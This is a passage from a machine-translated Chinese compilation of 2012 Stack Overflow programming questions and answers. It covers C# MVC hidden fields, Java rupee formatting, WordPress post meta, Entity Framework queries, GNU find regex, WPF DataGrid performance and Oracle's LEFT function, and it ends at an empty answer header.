    for (nextnode = tempnode->next; nextnode->next != NULL; nextnode = 
    nextnode->next)
    {
        if (tempnode->random > nextnode->random)
        {
            swap(tempnode, nextnode);
        }
    } 
```

# c# - 如何自动为模型制作隐藏字段？

> ID：11309204
> 
> 赞同：1
> 
> 时间：2012-07-03T10:41:15.070
> 
> 标签：c#, asp.net-mvc-3, hidden-field

我正在寻找自动在视图中创建隐藏字段的方法。这是我的模型：

```
public class MyViewModel()
{
    public int Id{get;set;}
    [Required]
    public string Name {get;set;
    public ComlexType MyComplexType{get;set;}
    ...
} 
```

鉴于我必须枚举所有模型字段：

```
@Html.HiddenFor(m=>m.Id);
@Html.HiddenFor(m=>m.MyComplexType.Title);

... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:23:57.353

如果您有许多类型要为此执行此操作，那么助手和反射可能是最好的。

如果你有少量这些，创建一个部分可能更容易添加你想要的隐藏

```
@{Html.RenderPartial("HiddenComplexType", Model );} 
```

您需要传递模型，而不是 ComplexType 成员。您可能需要一个接口或基类，部分可以用作模型

```
interface IHasComplexType
{
    ComplexType  GetComplexType();
}

public class MyViewModel : IHasComplexModel
{
    public ComplexType GetComplexType() { return MyComplexType;}
} 
```

还有其他方法可以做到这一点，但是您会进行反思，并且帮助者可能同样容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T18:58:18.503

在您看来，您可以使用：

```
@Html.EditorForModel() 
```

在您的模型中，您可以添加 HiddenInput 属性：

```
public class MyViewModel()
{
    [HiddenInput(DisplayValue = false)]
    public int Id{get;set;}
    [Required]
    public string Name {get;set;
    public ComlexType MyComplexType{get;set;}
    ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-04T10:08:50.720

我已经完成了下一个解决方案：“ReflectionHelper”类反映模型属性，并且在“属性”变量中是模型字段 {{'Id',1},{'Name','Myname'} 等}：

```
public static class ReflectionHelper
{
    public static void IterateProps(Object obj, string baseProperty, ref Dictionary<string,object> properties )
    {
        if (obj != null)
        {
            var baseType = obj.GetType();
            var props = baseType.GetProperties();
            foreach (var property in props)
            {
                var name = property.Name;
                var propType = property.PropertyType;
                if (propType.IsClass && propType.Name != "String")
                {
                    IterateProps(property.GetValue(obj, null), baseProperty + "." + property.Name, ref properties);
                }
                else
                {
                    properties.Add(baseProperty + "." + name, property.GetValue(obj, null));
                }
            }
        }
    }
} 
```

鉴于我做了下一个：

```
@using (Html.BeginForm("MyStep1", "Wizard"))
{
    var properties = new Dictionary<string, object>();
    ReflectionHelper.IterateProps(Model, Model.GetType().Name,ref properties);
    foreach (var property in properties)
    {
        <input type="hidden" name="@property.Key" value="@property.Value"/>
    }
} 
```

它是向导解决方案的一部分，稍后我将在 MVC 上写有关向导的文章，也许有人会发现有用。

# java - 在 Java 中支持新的印度货币符号

> ID：11309205
> 
> 赞同：5
> 
> 时间：2012-07-03T10:41:19.173
> 
> 标签：java, numbers, currency

如何使用 java.in 使用新的印度货币符号 (₹) 格式化数字。如果有任何解决方法让我们分享。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T12:41:46.097

在 Java 正确支持新字符之前，您可以使用其 unicode 值手动指定货币符号。

印度货币符号的 Unicode 是`U+20B9`

因此，要将此字符插入到 java 字符串中，请将其指定为`\u20B9`而不是默认的 DecimalFormat 货币值`\u00A4`

例如：

```
DecimalFormat formatter = new DecimalFormat("\u20B9 000"); 
```

不幸的是，这会将您的输出硬编码为始终显示卢比符号。如果您需要支持多个语言环境，您可以检查 user.country 系统属性。

```
boolean iAmInIndia = "IN".equals(System.getProperty("user.country"));
DecimalFormat formatter = iAmInIndia ? new DecimalFormat("\u20B9 000") : new DecimalFormat("\u00A4 000"); 
```

此外，用于显示此字符串的组件必须具有包含货币符号的字体。Window 7 上的 Arial 可以，但许多其他的却没有。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-04T16:56:13.063

[https://www.karnataka.gov.in/Documents/Rupee_Foradian.ttf](https://www.karnataka.gov.in/Documents/Rupee_Foradian.ttf)将此字体复制到 windows 字体文件夹中（在 RUN -> type fonts 中）。

然后字体 ProMed_Font=new Font("Rupee Foradian",Font.PLAIN,10); 将上面的字体设置为标签

示例：label.settext("100"+"`") 输出将是 100+卢比符号

![请正确输入密钥，如图所示](../Images/f349cf16325f4f694a3498566a9e0974.png)

# jquery - 后续的 AJAX 请求是否保证按顺序接收？

> ID：11309207
> 
> 赞同：7
> 
> 时间：2012-07-03T10:41:21.140
> 
> 标签：jquery, http, tcp

我有一个应用程序，用户可以在其中使用一个小切换开关/按钮来更改切换值，`true`并且`false`更改会自动发送到服务器，而无需用户明确按下“保存”之类的东西。

现在如果用户快速连续按两次拨动开关，服务器是否可能会乱序接收数据包，从而最终存储错误的值？服务器是指在服务器上运行的应用程序逻辑，而不是操作系统网络堆栈。

我知道 TCP 数据包已编号，因此接收操作系统在将它们传递给应用程序之前对其进行排序，并且 HTTP 在 TCP 之上运行。然而，我很好奇的部分是 HTTP 在什么情况下创建/不创建新的 TCP 连接。

注意我正在使用 jQuery 发送 AJAX 请求，并且我假设它们保证以与调用 jQuery 库的顺序相同的顺序发送。这个假设有效吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T10:45:29.797

http 协议中没有这样的保证。即使某些实现实际上可以保证它，您也不应该依赖它。

您可以这样做：维护一个点击计数（或者如果您愿意，可以将其称为版本号），并将其发送到服务器。在服务器上，当您更改状态时存储最后一个版本号，并使用此数字来检查您是否永远不会覆盖更新的值。

# iphone - 上传中断时最好的交互方式是什么？

> ID：11309208
> 
> 赞同：4
> 
> 时间：2012-07-03T10:41:21.157
> 
> 标签：iphone, objective-c, cocoa-touch, ipad, asihttprequest

我正在使用`ASIHTTPRequest`将照片上传到服务器，并且效果很好，但是当连接丢失时，上传会中断。那么处理这个问题的最佳方法是什么？服务器是否应支持此问题以使请求无效？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T10:51:21.157

这应该同时处理`iPhone`。当请求因中断而失败时，您应该有一个位列来上传项目。

当项目上传失败时不要更新那个位。当项目上传时，您需要更新该位标志，以便您知道该项目已上传。

**编辑**

您应该使用 ASIHTTPRequest didFinish 或 didFailed 的委托方法。在该方法中，您将跟踪项目是否已上传。

例如，您创建了像 ClsPhoto 这样的模型类，其中有 2 个属性，1 个是 UIImage，另一个是 BOOL。

现在，如果上传照片，则创建 BOOL 变量 true 并且不用担心。如果未上传，请将其保留为 False 并再次上传，提示用户您的上传被中断，您想继续。

这可以使用`Core Data`或使用`SQLITE`数据库来完成，也可以不将它们保存在内存中或`NSUserDefaults`

# c# - 是否可以强制接口实现在 C# 中是虚拟的？

> ID：11309212
> 
> 赞同：3
> 
> 时间：2012-07-03T10:41:34.220
> 
> 标签：c#, inheritance, interface

今天我遇到了一个问题，试图覆盖一个没有被声明为虚拟的接口方法的实现。

在这种情况下，我无法更改接口或基本实现，必须尝试其他方法，但我想知道是否有办法强制类使用虚拟方法实现接口。

例子：

```
interface IBuilder<T>
{
    // Already implicitly virtual
    /*virtual*/ T Build();
}

// This is a class written by someone else
class SimpleBuilder: IBuilder<SomeObject>
{
    // I would like to force this to be virtual
    public SomeObject Build() { return new SomeObject(); }
}

// This is the class I am writing.
class CustomBuilder: SimpleBuilder
{
    public /*override*/ SomeObject Build()
    {
        var obj = base.Build();
        obj.ModifyInSomeWay();
        return obj;
    }
} 
```

编辑：`CustomBuilder`旨在与 MEF 一起使用，因此我是从中派生的`SimpleBuilder`，以便 MEF 解析正确的类型。我已经尝试显式地实现接口并且根本不派生，`SimpleBuilder`但是 MEF 没有选择正确的类型。

有问题的接口和基类位于另一个开发人员创建的共享模块中，所以看起来我无论如何都必须让他们改变他们的基类。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T10:44:36.487

不，没有，在您的示例中，您正在[隐式实现](http://blogs.msdn.com/b/mhop/archive/2006/12/12/implicit-and-explicit-interface-implementations.aspx)接口。如果您的类要被子类化并且方法被覆盖，则由开发人员确保该方法被标记为虚拟方法。

没有办法强制接口方法的实现在代码中是可覆盖的，只有开发团队中的约定可以确保这一点（例如，所有接口都应该显式实现，所有接口实现都应该标记为虚拟等）。

在此特定示例中，您可以将抽象类插入层次结构：

```
abstract class VirtualBuilder<T> : IBuilder<T>
{
  abstract T Build();
} 
```

但这不适用于通用情况，因为您失去了接口的好处，并且“强制”所有具体类只实现一个接口。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T10:47:37.140

不直接，不。

您可以通过提供自己的基类并要求用户从中派生来“强制”它：

```
abstract class BuilderBase<T> : IBuilder<T>
{
    public abstract T Build();
} 
```

但这也有严重的问题，因为

1.  它不会立即阻止任何人直接实现接口（尽管您可以例如要求传入的参数`BuilderBase<T>`而不是简单的`IBuilder<T>`，或者甚至`IBuilder<T>` `internal`在另一个程序集中制作和隐藏它）
2.  它迫使接口的实现者放弃他们对单个基类的选择，他们可能会讨厌你

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T10:44:25.610

你不能强制它是虚拟的，但你可以使用 new 关键字；它被称为[方法隐藏](http://www.akadia.com/services/dotnet_polymorphism.html)。

```
// This is the class I am writing. 
class CustomBuilder: SimpleBuilder, IBuilder<T> 
{ 
    public new SomeObject Build() 
    { 
        var obj = base.Build(); 
        obj.ModifyInSomeWay(); 
        return obj; 
    } 
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T10:47:51.737

无法指定如何实现接口方法。

但是，即使基本实现不是虚拟的，您也有两种方法可以在子类上重新实现接口方法：

*   `new`使用方法限定符隐藏基本实现，或
*   像这样的显式接口实现：

    T IBuilder.Build() { var obj = Build(); obj.ModifyInSomeWay(); 返回对象；}

这些方法中的任何一种都将确保仅在通过接口访问您的类时才调用您的方法，但如果调用使用基类引用则不会。

所以我想说这个基类还没有准备好通过继承进行扩展。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-03T10:51:28.410

您不能这样做，因为接口只描述了类的外观，而没有说明实现本身。

换句话说，如果您使用的类实现了定义方法的接口，`Foo()`则可以确定，无论实现如何，该类都具有此方法。

你可以做什么：

```
public interface IBuilder<T>
{
    T Build();
}

public abstract class BaseBuilder<T> : IBuilder<T>
{
    public abstract T Build();
}

public class CustomBuilder : BaseBuilder<CustomBuilder>
{
    public override CustomBuilder Build()
    {
        throw new NotImplementedException();
    }
} 
```

# php - WP Query 与 get_post_meta 条件合并

> ID：11309213
> 
> 赞同：0
> 
> 时间：2012-07-03T10:41:40.287
> 
> 标签：php, wordpress

我正在制作一个侧边栏小部件，它只会出现在我的自定义帖子类型`exhibitors`单一模板上。

这个小部件只是从 中获取自定义字段元数据`exhibitors`并以列表格式输出。

每个自定义字段 post_meta 字段都有不同的用途，并且格式略有不同。有些只是文本，有些是超链接。

**我的问题**

如果我的 6 个 post_meta 中的任何一个存在，我就需要我的 WP Query 才能运行。

如果不存在，那么我不需要任何列表环境出现。

您将在下面看到我尝试过的方法，但失败得很惨。

```
<?php 

    $currentID      = get_the_ID();
    $exhibitorMeta      = new WP_Query(array(

      'post_type'       => 'exhibitors',
      'post_id'         => $currentID

)); ?>

<?php if ($exhibitorMeta->have_posts()) : ?> 

    <?php while ($exhibitorMeta->have_posts()) : $exhibitorMeta->the_post(); ?>

        <?php if (  get_post_meta($post->ID, 'Facebook Page', true) ||
                    get_post_meta($post->ID, 'Twitter User', true) ||
                    get_post_meta($post->ID, 'Web Address', true) ||
                    get_post_meta($post->ID, 'E-mail Address', true) ||
                    get_post_meta($post->ID, 'Stand Number', true) ||
                    get_post_meta($post->ID, 'Hall Number', true)
        ) { ?>

        <div class="module sidebar">

            <div class="module-head">

                Exhibitor Info

            </div>

            <div class="module-body">

                <ul class="sidebar-list">

                    <?php if (  get_post_meta($post->ID, 'Facebook Page', true) ) echo '

                        <li><a href="' . get_post_meta($post->ID, 'Facebook Page', true) . '">View our Facebook Page</a></li>

                    '; ?>

                    <?php if (  get_post_meta($post->ID, 'Twitter User', true) ) echo '

                        <li><a href="' . get_post_meta($post->ID, 'Twitter User', true) . '">Follow us on Twitter</a></li>

                    '; ?>

                    <?php if (  get_post_meta($post->ID, 'Web Address', true) ) echo '

                        <li><a href="' . get_post_meta($post->ID, 'Web Address', true) . '">View Website</a></li>

                    '; ?>

                    <?php if (  get_post_meta($post->ID, 'E-mail Address', true) )

                    $emailAddress = get_post_meta($post->ID, 'E-mail Address', true);

                    echo '

                        <li><a href="mailto:' . $emailAddress . '" title="' . $emailAddress . '" target="_blank">' . $emailAddress . '</a></li>

                    '; ?>

                    <?php if (  get_post_meta($post->ID, 'Stand Number', true) ) echo '

                        <li>Stand Number: ' . get_post_meta($post->ID, 'Stand Number', true) . '</li>

                    '; ?>

                    <?php if (  get_post_meta($post->ID, 'Hall Number', true) ) echo '

                        <li>Hall Number: ' . get_post_meta($post->ID, 'Hall Number', true) . '</li>

                    '; ?>

                </ul>

            </div>

            <div class="module-foot"></div>

        </div>

        <?php } ?>

    <?php endwhile; ?> 

<?php unset($exhibitorMeta); endif; wp_reset_query(); ?> 
```

您可以看到我尝试`||`在 WP 查询中使用 PHP 比较来仅在我的 6 个元值中的任何一个存在时才显示列表环境。但由于某种原因，它只输出了 6 次列表环境。

所以一切都错了。

**我的问题**

是否可以使用相同的 WP 查询信息来检索 post_meta 数据信息，但如果不存在 post_meta，则不会出现列表环境。

但是，如果存在一个或多个 post_meta，则列表环境会出现，并且活动的 post_meta 会以它们的格式化方式出现。

任何都会很棒，因为我似乎找不到太多使用这样的多个 post_meta 值。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-04T04:10:27.630

您希望 if 语句检查自定义值是否存在，而不是 get_post_meta 是否返回了某些内容。

尝试这个：

```
 <?php 
    $values = get_post_custom_values("Facebook Page"); 
    if ($values[0]) { ?>
        <li><a href="<?php echo $values[0]; ?>">View our Facebook Page</a></li>
    <?php 
    } else { 
        // 
    } 
    ?> 
```

# entity-framework - 实体框架断开的 POCO，具有大量记录的关系

> ID：11309216
> 
> 赞同：1
> 
> 时间：2012-07-03T10:41:47.937
> 
> 标签：entity-framework, orm, entity-relationship

我在分层架构中使用实体框架 POCO。获得实体（y/ies）后，我们应该断开连接工作。
假设我们有两个实体：

```
public class Customer
{  
  public int Id;  
  public string Name;
  public virtual IList<Order> Orders;
}  

public class Order
{
  public int Id;
  ....
} 
```

并假设，有一个客户的订单数为 1000。
在这种情况下，我们希望在服务方法中获取该客户仅在本周完成的订单。
Repository 方法和Service 方法应该如何拥有？

**编辑**

我想我应该扩展我的问题。
首先，我的意思是“有 1000 个订单的客户”，我不想得到那个客户。我想获取“Order.Date > DateTime.Now.AddDays(-7) 的客户订单（具有已知 ID，假设 Customer.Id=5）”。
表示 IQueryable 对象很容易。

```
public List<Order> GetOrdersInLastWeek(int CustomerId)  
{  
  Customer customer = (from c in ctx.Customers where c.Id == CustomerId).SingleOrDefault();  
  List<Order> ordersThatIWant = customer.Orders.Where(o => o.Date > DateTime.Now.AddDays(-7)).ToList();
  return ordersThatIWant;  
} 
```

我对这些很好奇：上面的代码运行良好。
- 但是，对于 ORM/N-Layer 最佳实践是否正确？因为 Order 不是“聚合根”，所以 Customer 是“聚合根”。
- 我是否必须在 CustomerService 类或 OrderService 类中拥有这个 GetOrdersInLastWeek？
- 对我来说最后也是最重要的一个；如果我有像 GetOrdersInLastWeek 这样的方法，以及像这样的其他方法，那么其他层（例如表示层）中的“Customer.Orders”导航属性呢（假设我们正在使用 POCO 实体并断开连接）？
- 另一个例子; 我想在服务方法中对 Customer.Orders 导航属性进行分页。我如何以及在哪里可以做到这一点（我知道怎么做，但我的意思是根据最佳实践）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T16:37:36.173

为此，您可以尝试混合使用急切加载和显式加载，例如使用`DbContext`(EF => 4.1) 类似：

```
public List<Customer> GetCustomersWithOrders()
{
    using (var ctx = new MyDbContext())
    {
        var customers1 = ctx.Customers.Include(c => c.Orders)
            .Where(c => c.Orders.Count() < 1000)
            .AsEnumerable();

        var customers2 = ctx.Customers
            .Where(c => c.Orders.Count() >= 1000)
            .AsEnumerable();

        DayOfWeek today = DateTime.Now.DayOfWeek;
        DateTime monday = DateTime.Now.AddDays(-1*(today-DayOfWeek.Monday));
        DateTime sunday = monday.AddDays(6);
        foreach (var customer in customers2)
        {
            ctx.Entry(customer).Collection(c => c.Orders).Query()
                .Where(o => o.ShipDate >= monday && o.ShipDate <= sunday)
                .Load();
        }

        return customers1.Concat(customers2).ToList();
    }
} 
```

结果将由`1 + 1 + customers2.Count`数据库查询的结果组成。如果客户有超过 1000 个订单的情况很少见，我认为这些多个查询不会是一个大的性能问题。

**编辑**

我建议更改您的查询。问题是您加载了一个客户（查询 1），然后触发了*所有*订单的延迟加载（查询 2）。因此，在您在内存中应用过滤器之前，您可能已经加载了超过 1000 个订单。您可以使用以下方法避免这种情况：

```
public List<Order> GetOrdersInLastWeek(int CustomerId)  
{  
    var date = DateTime.Now.AddDays(-7);
    var orders = ctx.Customers
        .Where(c => c.Id == CustomerId)
        .Select(c => c.Orders.Where(o => o.Date > date))
        .SingleOrDefault();

    if (orders == null)
        return null; // or create an empty list

    return orders.ToList();
} 
```

关于您的问题：

> 我应该在 CustomerService 类或 OrderService 类中拥有这个 GetOrdersInLastWeek 吗？

在`CustomerService`. 因为您正在加载特定客户的数据。但`OrderService`在我看来，使用 也不是错的。

> 我想在服务方法中对 Customer.Orders 导航属性进行分页。我如何以及在哪里可以做到这一点（我知道怎么做，但我的意思是根据最佳实践）？

对于您当前的架构，您必须在您的服务方法中执行此操作（使用`Skip`and创建查询`Take`），因为您正在公开内存中的集合，即来自服务方法的具体化结果。因此，您不应该在服务之外进行分页，因为它会强制您在分页之前加载*所有*数据。在我看来，唯一的选择是`IQueryable<T>`从服务返回，然后通过添加`Skip`和`Take`查询在 UI 层中进行分页。但这意味着您不能在 UI 层断开连接。

# spring - 中断正在运行的spring mybatis事 务

> ID：11309222
> 
> 赞同：1
> 
> 时间：2012-07-03T10:42:23.273
> 
> 标签：spring, transactions, interrupt, mybatis, spring-transactions

spring 和 mybatis 是否可以中断正在执行的 mybatis 数据库事务？

例子：

我有一个将数千条记录插入 Oracle SQL 数据库的应用程序。这大约需要 5 分钟。如果用户在插入记录时按下“停止”按钮，我想停止数据库事务并回滚更改。

使用事务管理器完成数据库过程后，我可以回滚事务：

```
TransactionStatus status = txManager.getTransaction(def);
txManager.rollback(status) 
```

但我无法在事务运行时中断事务。

在 JDBC 中，我会简单地做：`PreparedStatement.cancel()`

我试图在 MyBatis 中获得这个 PreparedStatement，但我认为这是不可能的。

有没有人可以解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-16T07:11:11.263

我认为您可以从会话工厂获取当前会话，然后调用 Session.cancelQuery() 我认为反过来使用 db 调用来取消查询执行。

根据休眠文档，它是线程安全的

[休眠会话](http://docs.jboss.org/hibernate/orm/3.5/api/org/hibernate/impl/SessionImpl.html#cancelQuery%28%29)

> 取消当前查询的执行。这是会话上唯一可以从另一个线程安全调用的方法。

# visual-studio-2010 - Visual Studio 2010 .suo 文件 wrt 链接

> ID：11309233
> 
> 赞同：0
> 
> 时间：2012-07-03T10:43:18.033
> 
> 标签：visual-studio-2010, fortran, static-linking

我在静态链接我的一个 Fortran 项目时遇到了很多麻烦——而解决方案中的现有项目工作正常。在尝试找出原因的同时，我一直在梳理VS2012的项目和解决方案属性中的各种选项，并没有发现任何差异。然后，我开始使用 Notepad++ 的“在文件中查找”功能搜索解决方案和项目的元数据。

到目前为止，我在元数据中发现的唯一区别是搜索词“*工作库*.lib”多次出现在二进制文件 .suo 中，而搜索词“*未链接库*.lib”没有出现在.suo。他们各自的项目都以明显相同的方式出现在 .sln 文件中。

谁能告诉我是否：

1) .suo 文件是二进制文件，搜索不起作用并返回误报。

2）.suo 实际上没有提到“*不链接库*.lib”，这就是我遇到问题的原因。

由于 .suo 文件是派生数据并且不受源代码控制，因此必须指定其中包含的*内容*- 但是是什么。MSDN 网站只说明了哪些 API 可用于提取数据......

# java - 无法从文本文档中检索 XBookmarksSupplier

> ID：11309235
> 
> 赞同：0
> 
> 时间：2012-07-03T10:43:21.650
> 
> 标签：java, openoffice-writer, uno

我有各种文本文档（.odt、.doc）等，我将它们用作模板，以便使用 Java 向它们填充文本。为了实现这一点，我已将 TextFields 添加到要插入文本的每个位置的文档中，并枚举 TextFields 集并为它们分配值。但是我真正想做的是，因为这些文档仅用于打印，所以能够使用书签而不是 TextFields（当没有填充时仍然是空的并且看起来很有趣）。但是，无论每当我尝试检索文档时我在文档模板上手动插入多少书签，我都会`XBookmarksSupplier`得到一个空值，即

> XBookmarksSupplier bookmarksSupplier = (XBookmarksSupplier) UnoRuntime.queryInterface(XBookmarksSupplier.class, document);

一片空白。该参数`document`是我通过创建文档的内存副本获得的 XComponent，我以以下方式将其用作模板：

```
XComponentLoader loader = (XComponentLoader) UnoRuntime.queryInterface(XComponentLoader.class, desktop); 

List<PropertyValue> props = new ArrayList<PropertyValue>(); 
PropertyValue p = null; 

p = new PropertyValue(); 
p.Name = "AsTemplate"; 
p.Value = new Boolean (true); 
props.add(p); 

p = new PropertyValue(); 
p.Name = "DocumentTitle"; 
p.Value = "New doc"; 
props.add(p); 

p = new PropertyValue(); 
p.Name = "Hidden"; 
p.Value = new Boolean(true); 
props.add(p);

PropertyValue[] properties = new PropertyValue[props.size()]; 
props.toArray(properties); 

XComponent document = null;

String templateFileURL = filePathToURL(templateFile); 
document = loader.loadComponentFromURL(templateFileURL, "_blank", 0, properties); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-04T08:57:43.303

嗯，最后我想通了。通过使用 Eclipse 自动建议，我错误地导入了正确的类，`com.sun.star.sdb.XBookmarksSupplier`而不是`com.sun.star.text.XBookmarksSupplier`正确的类。由于各种复制粘贴了我所有使用相同错误类的测试。

# mongodb - 如果使用 mongo-jackson-mapper 不存在对象，如何将它插入到集合中？

> ID：11309237
> 
> 赞同：0
> 
> 时间：2012-07-03T10:43:26.653
> 
> 标签：mongodb, jackson, mongo-jackson-mapper

我找不到这个简单操作的 API。我需要做的是插入一个新文档，如果它不存在，所以我正在尝试使用“upsert”：

```
JacksonDBCollection<User, String> collection = 
    JacksonDBCollection.wrap(database.getCollection("users"), 
            User.class, String.class);
collection.ensureIndex("email");
collection.update(DBQuery.in("email", user.email),
    <what should I put here?>, true, false); 
```

我需要插入的对象是“用户”，但 update() 签名只接受 DBQuery 实例。

谢谢，迈克尔

# regex - 尽管使用 regextype egrep，为什么 GNU find 实用程序会在正则表达式与 egrep 上产生不同的匹配？

> ID：11309239
> 
> 赞同：2
> 
> 时间：2012-07-03T10:43:29.577
> 
> 标签：regex, find

我想使用 find 来查找以小写字母开头的目录中的每个文件。一个简单的正则表达式结合 find 应该可以解决这个问题（我不需要处理文件名中的空格）。

所以我尝试了`find . -regextype posix-egrep -regex '^.*/[a-z][^/]*$' -type f`。它返回了，除其他外，我认为不应该匹配，`./config/Config.scala`.

所以我认为我的正则表达式是错误的，并使用 egrep 本身进行了测试`echo './config/Config.scala' | egrep '^.*/[a-z][^/]*$'`：没有比赛。

`find`我错过了什么？我已经知道`-regex`对相对文件路径而不是文件名进行操作（我不喜欢，但这是另一个问题）。查找版本为 4.4.2

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T12:07:36.587

我试图用这一系列命令重现：

```
mkdir testtmp
cd testtmp
mkdir config
touch config/Config.scala
find . -regextype posix-egrep -regex '^.*/[a-z][^/]*$' -type f 
```

并没有输出。我也找到了 Debian 打包的 4.4.2。

**更新**

我敢打赌这是一个语言环境，它`[a-z]`匹配的不仅仅是我们都知道的 26 个小写字母。试试这个：

```
LC_ALL=C find . -regextype posix-egrep -regex '^.*/[a-z][^/]*$' -type f 
```

# c# - WPF 数据网格绑定太慢

> ID：11309242
> 
> 赞同：0
> 
> 时间：2012-07-03T10:43:38.500
> 
> 标签：c#, wpf, xaml, .net-4.0

在我的 WPF 应用程序中，我生成具有动态列数的数据网格。部分代码：

```
for (var i = datetime; i < datetime.AddDays(1); i+= TimeSpan.FromHours(1)){
    var column = new DataGridTemplateColumn();
    column.Header = (i+1).ToString();
    column.CellTemplate = (DataTemplate)XamlReader.Load(
            new MemoryStream(Encoding.Default.GetBytes(
                @"<DataTemplate xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml'><TextBlock Text='{Binding Values[" + i + @"]." + propName + @"}'/></DataTemplate>"
            ))); 
    column.CellEditingTemplate = (DataTemplate)XamlReader.Load(
            new MemoryStream(Encoding.Default.GetBytes(
                @"<DataTemplate xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml'><TextBox Text='{Binding Values[" + i + @"]." + propName + @", Mode=TwoWay}'/></DataTemplate>"
            ))); 
    dataGrid1.Columns.Add(column);
}
dataGrid1.ItemsSource = data;

<DataGrid EnableColumnVirtualization="true" EnableRowVirtualization="true" Name="dataGrid1" DockPanel.Dock="Top" AutoGenerateColumns="False" 
                   Height="120" Width="Auto" /> 
```

当我的表包含 25 列和 10 行时，它的渲染速度太慢（1 秒）。如何提高数据绑定的性能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:50:20.773

您应该为所有列使用相同的数据模板实例。

只需将`XamlReader.Load()`调用移出循环并为所有列使用相同的实例：

```
var cellTemplate = (DataTemplate)XamlReader.Load(...);
var cellEditTemplate = (DataTemplate)XamlReader.Load(...);
for(...)
{
   //..
   column.CellTemplate = cellTemplate;
   column.CellEditingTemplate = cellEditTemplate;
   //...
} 
```

# java - 错误的字符串宽度

> ID：11309243
> 
> 赞同：1
> 
> 时间：2012-07-03T10:43:38.863
> 
> 标签：java, swing

我有以下用于计算对话框标题宽度的代码。

```
FontRenderContext frc = new FontRenderContext(null, true, true);
TextLayout tl = new TextLayout(getTitle(), getFont(), frc);
double w = tl.getPixelBounds(null,  0, 0).getWidth(); 
```

但是由于某种原因，文本宽度计算错误。我检查了此代码以计算单选按钮标签文本宽度，它工作正常。我主要关心的是对话框字体，我不确定我是否正确理解它。

例如对于标题`test`计算宽度是`20`然而实际宽度是`23`。较长的字符串是计算宽度和实际宽度之间的较大差异。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T11:47:50.610

你得到一个错误的结果，因为对话框标题和它使用的字体是本机资源。

如果您的应用程序仅适用于 Windows，则可以使用以下代码获取宽度：

```
Font f = (Font)Toolkit.getDefaultToolkit().getDesktopProperty("win.frame.captionFont");  
Graphics gr = getGraphics();  
FontMetrics metrics = gr.getFontMetrics(f);  
int width = metrics.stringWidth(getTitle()); 
```

否则尝试从标题栏的字体中获取 FontMetrics：

```
Container titleBar = (Container) dialog.getLayeredPane().getComponents()[1];
FontMetrics metrics = titleBar.getFontMetrics(titleBar.getFont());
int width = metrics.stringWidth(getTitle()); 
```

如果是动态设置对话框的宽度，还需要考虑LaF间距和边框。尝试这个：

```
// This is the space inserted on the left of the title, 5px in Metal LaF
width += 5; 

// This is the space for the close button, LaF dependent.
width += 4;

// Add the borders
width += dialog.getWidth() - dialog.getContentPane().getWidth();

// Finally set the size
dialog.setSize(new Dimension(width, dialog.getPreferredSize().height)); 
```

希望这会奏效。如果您想知道这些数字来自哪里，它们位于[JDK 源代码](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/javax/swing/plaf/metal/MetalTitlePane.java)中。

# android - Android 工具提示活动

> ID：11309246
> 
> 赞同：1
> 
> 时间：2012-07-03T10:43:50.407
> 
> 标签：android, tooltip

我正在尝试准备我的活动的“如何使用”窗口，但实际上我正面临一些概念问题。

我看到了一些类似的应用程序；

应用程序启动时；透明窗口显示新添加的功能或按钮的职责。例如，最新的 youtube 应用程序更新在 youtube 应用程序的第一次启动时包含订阅的频道使用提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:46:14.643

您可以在创建主活动后实例化您的工具提示活动，并使用透明度设置。为此，您可以阅读其他回复：

[如何在 Android 上创建一个透明的 Activity？](https://stackoverflow.com/questions/2176922/how-to-create-transparent-activity-in-android)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T10:48:40.363

你可以让你的活动主题像..

[如何在 Android 上创建一个透明的 Activity？](https://stackoverflow.com/questions/2176922/how-to-create-transparent-activity-in-android)

并在共享首选项中放置一个变量以检查应用程序的首次启动。

# sql - Oracle 中的 LEFT 函数

> ID：11309247
> 
> 赞同：10
> 
> 时间：2012-07-03T10:43:54.667
> 
> 标签：sql, oracle

我正在查看一个 Oracle (10g) 存储过程并遇到以下`LEFT`/`RIGHT`函数。

```
TO_DATE(LEFT('01-Jun-1201',9)) 
```

在 Toad 编辑器中，我无法运行此功能，必须将其更改为`LPAD`

```
TO_DATE(LPAD('01-Jun-1201',9)) 
```

存储过程使用`LEFT`/`RIGHT`功能运行良好，但如果我使用`LPAD`/运行速度更快`RPAD`。

Oracle中是否有任何`LEFT`功能，如果没有，那么为什么存储过程运行良好？

```
SELECT
    SUM(DECODE(SIGN(TO_DATE(LEFT('01-Jun-12', 9)) - TO_DATE(logdate)),
               -1, totaltime, 0, totaltime, 0)) AS totaltime
  FROM AREA2.v_area
  WHERE logdate >= TO_DATE(RIGHT('01-Jun-12', 9))
    AND logdate <= TO_DATE('30-Jun-12') 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2017-08-03T22:48:59.340

